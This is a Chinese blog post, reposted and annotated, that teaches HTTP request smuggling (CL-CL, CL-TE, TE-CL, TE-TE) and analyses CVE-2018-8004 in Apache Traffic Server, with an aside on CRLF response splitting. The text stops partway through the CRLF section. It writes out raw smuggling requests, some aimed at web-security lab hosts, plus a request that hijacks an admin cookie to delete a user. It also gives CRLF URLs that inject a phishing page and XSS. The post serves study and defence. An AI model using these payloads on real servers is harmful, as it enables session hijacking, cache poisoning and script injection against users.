@@ -1,0 +1,949 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="make changes, make perfect">
+  <meta name="author" content="Dr34d">
+  <meta name="keywords" content="blog">
+  <title>【转载】协议层的攻击——HTTP请求走私 - Dr34d&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/xt256.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"greydr34d.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Dr34d's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Dr34d's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/http_smuggle.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="【转载】协议层的攻击——HTTP请求走私">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-10-19 09:30" pubdate>
+        2019年10月19日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      82
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【转载】协议层的攻击——HTTP请求走私</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：9 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="0x01-HTTP走私攻击学习"><a href="#0x01-HTTP走私攻击学习" class="headerlink" title="0x01 HTTP走私攻击学习"></a>0x01 HTTP走私攻击学习</h2><p>参考网址：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/#31-cl0get">https://paper.seebug.org/1048/#31-cl0get</a> 协议层的攻击——HTTP请求走私</p>
+<h3 id="一、产生原因"><a href="#一、产生原因" class="headerlink" title="一、产生原因"></a>一、产生原因</h3><p>为了使得用户在访问服务器资源能够获得更好的访问体验，加快用户访问资源的速度，通常在用户和服务器之间放置一台缓存服务器来进行资源的缓存。拓扑图如下：<br><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1571366802717.png" alt="1571366802717"></p>
+<h4 id="Pipeline："><a href="#Pipeline：" class="headerlink" title="Pipeline："></a>Pipeline：</h4><p>Pipeline是对keep-alive的一个延伸，keep-alive要求不终止TCP连接，而Pipeline允许客户端采用流水线的方式发送报文而不用等待服务端相应，发送过去的报文在服务端进行对应，这进一步提升了访问速度。</p>
+<h4 id="问题所在："><a href="#问题所在：" class="headerlink" title="问题所在："></a>问题所在：</h4><p>如果两台服务器对于报文的处理方式有差异，恶意攻击者可以对报文进行混淆，使得第一台服务器认为是正常的HTTP请求，而第二台服务器只认可报文中的一部分，另外一部分的报文就算是走私的请求。</p>
+<h4 id="不严格遵守RFC标准"><a href="#不严格遵守RFC标准" class="headerlink" title="不严格遵守RFC标准"></a>不严格遵守RFC标准</h4><p> Request For Comments（RFC），是一系列以编号排定的文件。文件收集了有关互联网相关信息，以及UNIX和互联网社区的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053">软件</a>文件。目前RFC文件是由Internet Society（ISOC）赞助发行。基本的互联网通信协议都有在RFC文件内详细说明。RFC文件还额外加入许多在标准内的论题，例如对于互联网新开发的协议及发展中所有的记录。因此几乎所有的互联网标准都有收录在RFC文件之中。 </p>
+<p>RFC标准中规定了如何处理可以防止此漏洞，但是不严格遵守这些标准的服务器就会出现这种问题</p>
+<h3 id="二、CL不为0的情况"><a href="#二、CL不为0的情况" class="headerlink" title="二、CL不为0的情况"></a>二、CL不为0的情况</h3><p>CL不为0的请求可能影响到所有不携带请求体的报文</p>
+<p>示例如下：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length: 44<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+
+GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div>
+
+<p>不仅仅是GET请求，如果前端服务器允许GET请求携带请求体，读取到Content-Length后将下面的部分当做请求的内容。而后端服务器不允许GET请求携带请求体，就不会处理Content-Length这个字段，所以后面的内容就被当做了另外一个GET请求来处理，</p>
+<p>如果前端服务器做了waf只对get参数进行过滤，而后端服务器没有waf的话，通过这样的走私，完全可以将前端的waf绕过。(这里还有待修改，不一定正确)</p>
+<h3 id="三、CL-CL"><a href="#三、CL-CL" class="headerlink" title="三、CL-CL"></a>三、CL-CL</h3><p>所谓CL-CL就是含有两个Content-Length字段，前端服务器处理第一个字段后，发送给后端服务器就只剩下了第二个Content-Length，如果这两个字段的值不一样的话，后端服务器会忽略掉请求体中的部分内容，由于PipeLine机制的存在，被忽略的内容会连接上下一个报文，从而影响到下一个报文的内容。</p>
+<p>示例如下：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length: 8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length: 7<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+12345<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+a</code></pre></div>
+
+<p>第一个服务器处理了Content-Length=8，正好将所有的请求体都当做了该报文的一部分， 进而发送给第二个服务器，这时候报文中只有第二个Content-Length=7，后端服务器在处理的时候只读取到了<code>12345\r\n</code>,剩余的a没有被读取到，由于存在PipeLine机制，a被拼接到了下一个报文，造成下一个报文出错。如果精心构造，可以构造出一个新的报文。至于怎么绕过waf的，还不太明白，后面学会了后再上来补充</p>
+<h3 id="四、CL-TE"><a href="#四、CL-TE" class="headerlink" title="四、CL-TE"></a>四、CL-TE</h3><p>先来了解一下HTTP中的Transfer-Encoding字段：</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/da01a20a515e">https://www.jianshu.com/p/da01a20a515e</a> 关于HTTP1.1的Transfer-Encoding:chunked</p>
+<p>Transfer-Encoding是HTTP头中的一个字段，字面意思是传输编码，现在的http中，传输编码只规定了一种格式：Trunk，也就是分块编码</p>
+<p>分块编码的机制是，传输的数据分为一系列数据块，并且以一个或者多个发送，这样服务器就可以不预先知道发送内容的总大小，每个分块包含十六进制的长度和数据，长度独占一行，长度不包括它结尾的CRLF，也不包括数据后面的CRLF，最后一个分块的长度值必须为0，表示对应分块没有数据，实体结束</p>
+<p>Trunk的传输形式如下：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs trunk">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</code></pre></div>
+
+<p>（注意实际发送trunk的时候不需要[ ])</p>
+<h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE:"></a>CL-TE:</h4><p>指的是前端服务器只处理Content-Length字段，而后端服务器忽略Content-Length字段，处理Transfer-Encodiing</p>
+<p>构造数据包</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Accept-Language: en-US,en;q=0.5<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Connection: keep-alive<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+G</code></pre></div>
+
+<p>前端服务器接收到请求后，处理Content-Length字段</p>
+<p>0\r\n<br>\r\n<br>G</p>
+<p>刚好长度为6，而后端服务器读取Transfer-Encoding，读取到</p>
+<p>0\r\n<br>\r\n</p>
+<p>后认为分段报文读取完毕了，G留在了缓冲区中，连接到了下一个报文，使得下一个报文出错</p>
+<h3 id="五、TE-CL"><a href="#五、TE-CL" class="headerlink" title="五、TE-CL"></a>五、TE-CL</h3><p>指的是前端服务器处理Transfer-Encoding字段，而后端服务器处理Content-Length字段。</p>
+<p>构造数据包：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Accept-Language: en-US,en;q=0.5<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+GPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div>
+
+
+
+<p>原文的解释是，前端服务器处理Transfer-Encoding，读取到结尾处正好12个字符(暂时不明白为什么只有12个字符)，把它当做完整的报文发送给后端的服务器，后端的服务器解析Content-Length，读取到<code>12\r\n</code>就结束了，后面的被解析成另一个报文，所以产生错误</p>
+<h3 id="六、TE-TE"><a href="#六、TE-TE" class="headerlink" title="六、TE-TE"></a>六、TE-TE</h3><p>前后端都处理Transfer-Encoding，但是我们可以通过混淆使得其中一台服务器不处理Transfer-Encoding，转而处理Content-Length</p>
+<p>构造数据包：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Accept-Language: en-US,en;q=0.5<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Transfer-encoding: cow<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+GPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div>
+
+
+
+<h2 id="0x02-CVE-2018-8004-http走私攻击实例分析"><a href="#0x02-CVE-2018-8004-http走私攻击实例分析" class="headerlink" title="0x02 CVE-2018-8004 http走私攻击实例分析"></a>0x02 CVE-2018-8004 http走私攻击实例分析</h2><h3 id="一、可利用点1：冒号问题"><a href="#一、可利用点1：冒号问题" class="headerlink" title="一、可利用点1：冒号问题"></a>一、可利用点1：冒号问题</h3><h4 id="当ATS服务器接收到的请求中存在请求字段与-之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回400错误，而是直接将其转发给后端服务器。"><a href="#当ATS服务器接收到的请求中存在请求字段与-之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回400错误，而是直接将其转发给后端服务器。" class="headerlink" title="当ATS服务器接收到的请求中存在请求字段与:之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回400错误，而是直接将其转发给后端服务器。"></a>当ATS服务器接收到的请求中存在请求字段与<code>:</code>之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回<code>400</code>错误，而是直接将其转发给后端服务器。</h4><p>如果后端为nginx服务器，nginx服务器在处理字段与冒号前有空格时，不会反回400，而是忽略该字段，如果我们将Content-Length字段与冒号中间加一个空格使得后端服务器不解析请求体，请求体留在缓冲区中，这就造成了走私，进一步构造，使得后面的报文直接连接上这部分内容，劫持后面的报文。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: lnmp.mengsec.com
+<span class="hljs-attribute">Content</span>-Length : <span class="hljs-number">56</span>
+
+<span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+<span class="hljs-attribute">Host</span>: lnmp.mengsec.com
+<span class="hljs-attribute">attack</span>: <span class="hljs-number">1</span>
+<span class="hljs-attribute">foo</span>:</code></pre></div>
+
+<p>（注意：foo:后面没有\n\r，也就是说如果这段内容存在于缓冲区中的话，会和后面的报文连接）</p>
+<p>Content-Length字段与冒号重甲加了一个空格，导致nginx不解析该字段，后面的请求体直接被当做了下一个报文</p>
+<p>当下一个报文到达的时候拼接结果如下：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n
+<span class="hljs-attribute">Host</span>: lnmp.mengsec.com\r\n
+<span class="hljs-attribute">attack</span>: <span class="hljs-number">1</span>\r\n
+<span class="hljs-attribute">foo</span>: GET / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n
+<span class="hljs-attribute">Host</span>: <span class="hljs-number">10.211.55.2:10086</span>\r\n
+<span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">10.211.55.2</span>\r\n
+<span class="hljs-attribute">Via</span>: http/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> mengchen-ubuntu[<span class="hljs-number">3</span>ff<span class="hljs-number">3687</span>d-fa<span class="hljs-number">2</span>a-<span class="hljs-number">4198</span>-bc<span class="hljs-number">9</span>a-<span class="hljs-number">0</span>e<span class="hljs-number">98786</span>adc<span class="hljs-number">62</span>] (ApacheTrafficServer/<span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>)\r\n</code></pre></div>
+
+<p>这样两个报文拼接成了一个正常的报文。</p>
+<h4 id="攻击示例："><a href="#攻击示例：" class="headerlink" title="攻击示例："></a>攻击示例：</h4><p>假设后端服务器中存在如下php文件：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] == <span class="hljs-number">1</span>)&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are Admin\n&quot;</span>;
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>]))&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;del user &#x27;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;del&#x27;</span>];
+    &#125;
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not Admin&quot;</span>;
+&#125;</code></pre></div>
+
+<p>构造第一个请求包：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Content-Length : 78<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+GET /admin.php?del=mengchen HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>
+foo:</code></pre></div>
+
+<p>请求体直接走私，假如下一个请求包内容如下：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>lnmp.mengsec.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>admin=1</code></pre></div>
+
+<p>连接之后为：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /admin.php?<span class="hljs-attribute">del</span>=mengchen HTTP/1.1\r\n
+Host: lnmp.mengsec.com\r\n
+attack: 1\r\n
+foo: <span class="hljs-builtin-name">GET</span> / HTTP/1.1
+Host: lnmp.mengsec.com
+Cookie: <span class="hljs-attribute">admin</span>=1</code></pre></div>
+
+<p>foo字段的值为<code>GET / HTTP/1.1</code></p>
+<p>合并成了一个http请求，劫持了后面的会话的Cookie，达到删除用户的效果。</p>
+<h3 id="二、可利用点2：返回400错误时，没有关闭TCP连接"><a href="#二、可利用点2：返回400错误时，没有关闭TCP连接" class="headerlink" title="二、可利用点2：返回400错误时，没有关闭TCP连接"></a>二、可利用点2：返回400错误时，没有关闭TCP连接</h3><p>文章中提到了一个HTTP拆分攻击，我简单学习了一下，发现同样挺有意思。穿插一段HTTP相应拆分攻击。</p>
+<hr>
+<h4 id="补充：HTTP响应拆分攻击"><a href="#补充：HTTP响应拆分攻击" class="headerlink" title="补充：HTTP响应拆分攻击"></a>补充：HTTP响应拆分攻击</h4><p>参考资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/3755276.html">https://www.cnblogs.com/milantgh/p/3755276.html</a>   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/3755276.html">浅谈HTTP响应拆分攻击</a> </p>
+<p>理解HTTP响应拆分攻击，需要理解服务器的缓存响应机制。</p>
+<h5 id="主要是以下几个要点："><a href="#主要是以下几个要点：" class="headerlink" title="主要是以下几个要点："></a>主要是以下几个要点：</h5><ol>
+<li>http报文的一一对应，也就是一个相应对应一个请求，两者相互对应，如果缓冲区中存在某个响应但是没有相应的请求的话，这个响应就会被挂起。一旦有请求到来时就会直接将这个被挂起的响应发送出去。</li>
+<li>HTTP响应拆分攻击的环境与HTTP走私攻击的环境相似，都存在前端服务器和后端服务器，前端服务器的缓存机制会将该攻击的范围扩大。</li>
+<li>怎么进行http响应拆分攻击。就相当于攻击者在请求包中加上一个Content-length=0但是经过精心构造的报文。</li>
+</ol>
+<p>示例：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.abc.com/index.php?lang=german%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent- Length:%<span class="hljs-number">200</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aHTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">20200</span>%<span class="hljs-number">20</span>OK%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Type:%<span class="hljs-number">20</span>text/html%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Length:%<span class="hljs-number">2041</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aHello, you have been phished</code></pre></div>
+
+<p>这个示例中，由于Content-Length的长度为0，所以这里的%0d%0a也就是CRLF会使后面的内容绕过解析，留在缓冲区中。成为一个被挂起的响应报文。再次请求的时候，无论请求的是何种内容，假设这里是<code>index.php</code>。这个报文都被直接发送了回来，攻击者精心构造的报文内容就会呈现在自己页面中。</p>
+<p>这个看似只能攻击到自己，怎么攻击到别人呢，这里就利用到了前端代理服务器的缓存功能。前端代理服务器时常向后端服务器请求缓存的响应。这就导致攻击者的响应报文被缓存到了前端服务器，之后的用户再访问<code>index.php</code>这个页面的时候，前端服务器直接进行处理，给所有用户返回攻击者的响应报文。</p>
+<h5 id="进行xss利用"><a href="#进行xss利用" class="headerlink" title="进行xss利用"></a>进行xss利用</h5><p>很好理解，直接写入js代码。在用户的浏览器上执行</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.abc.com/index.php?lang=german%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent- Length:%<span class="hljs-number">200</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aHTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">20200</span>%<span class="hljs-number">20</span>OK%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent-Type:%<span class="hljs-number">20</span>text/html%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aContent- Length:%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aalert(&#x27;在你的计算机上运行JavaScript&#x27;)</code></pre></div>
+
+<p>如果插入的是beef的hook地址，所有用户都会被hook到。</p>
+<h5 id="进行CSRF利用。"><a href="#进行CSRF利用。" class="headerlink" title="进行CSRF利用。"></a>进行CSRF利用。</h5><p>原理和xss类似。这里不做过多记录了。</p>
+<hr>
+<h4 id="补充：CRLF注入攻击（也就是HTTP拆分攻击，与上面补充的类似）"><a href="#补充：CRLF注入攻击（也就是HTTP拆分攻击，与上面补充的类似）" class="headerlink" title="补充：CRLF注入攻击（也就是HTTP拆分攻击，与上面补充的类似）"></a>补充：CRLF注入攻击（也就是HTTP拆分攻击，与上面补充的类似）</h4><p>参考资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/uestc2007/p/10880338.html">https://www.cnblogs.com/uestc2007/p/10880338.html</a> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/uestc2007/p/10880338.html">CRLF注入</a></p>
+<p><strong>产生的原因：没有对用户输入的CR和LF字符进行严格过滤。</strong></p>
+<p> CRLF 指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a)。 </p>
+<p>为什么没有严格过滤CRLF字符会造成这种危害呢，下面给出一个简单的例子：</p>
+<p>这是服务端的代码</p>
